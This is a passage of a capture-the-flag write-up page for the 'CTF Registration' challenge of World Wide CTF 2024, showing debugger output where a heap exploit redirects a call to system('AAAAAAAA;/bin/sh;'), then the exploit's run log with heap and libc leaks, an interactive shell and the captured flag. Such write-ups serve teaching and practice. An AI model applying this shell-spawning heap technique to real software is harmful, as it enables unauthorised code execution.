+   $rsi = 0x00007ffff7e07710 → &lt;__vfprintf_internal+06e0&gt; endbr64 ,
+   $rdx = 0x00007fffffffe1f8 → 0x00007fffe00000b8 → "AAAAAAAA;/bin/sh;",
+   $rcx = 0x00005555555593e0 → 0x3a656741000a7325 ("%s\n"?),
+   $r8 = 0x00007ffff7f63460 → 0x0000000000000000,
+   $r9 = 0x000000007fffffff
+)
+
+gef➤  telescope 0x7ffff7fac098
+0x00007ffff7fac098│+0x0000: 0x00007ffff7de2d70  →  &lt;system+0000&gt; endbr64 </code></pre></figure>
+
+<p>This will effectively execute <code class="language-plaintext highlighter-rouge">system("AAAAAAAA;/bin/sh;")</code> resulting in a shell :)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">python3 xpl.py 1
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to ctf-registration.chal.wwctf.com on port 1337: Done
+[*] HEAP leak    : 0x7c0fd00000e0
+[*] HEAP base    : 0x7c0fd0000000
+[*] HEAP main    : 0x7c0fe139a000
+[*] LIBC base    : 0x7c0fe1136000
+[*] Switching to interactive mode
+\x00d\x00orry ! No spots left :/\x00ow old is the hacker? \x00lu\x00hat's the hacker's name ? \x0016[^
+]s\x00\x00\x00ow would you describe this hacker ? \x0032[^
+]s\x00our hacker number is %zu !
+\x00\x00\x00hat is the hacker's number ? \x00zu\x00nvalid index.\x00\x00\x00\x00orry, but no hacker is registered as number %zu...
+\x00\x00========================= HACKER ========================\x00ame: %s
+\x00ge: %lu
+\x00escription: %s
+\x00=========================================================\x00nvalid option
+&gt;&gt; What is the hacker's number ? $ ls
+chall
+flag.txt
+$ cat flag.txt
+wwf{h0w_d1d_y0u_m4n4g3_t0_h4ck_my_sup3r_rpm4ll0c_pr0gr4m_:(((((}</code></pre></figure>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=World Wide CTF 2024 - CTF Registration&amp;url=https://kileak.github.io/ctf/2024/wwctf2024-ctfreg/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2024/wwctf2024-ctfreg/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2024/wwctf2024-ctfreg';
+        var disqus_title = 'World Wide CTF 2024 - CTF Registration';
+        var disqus_url = 'https://kileak.github.io/ctf/2024/wwctf2024-ctfreg';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
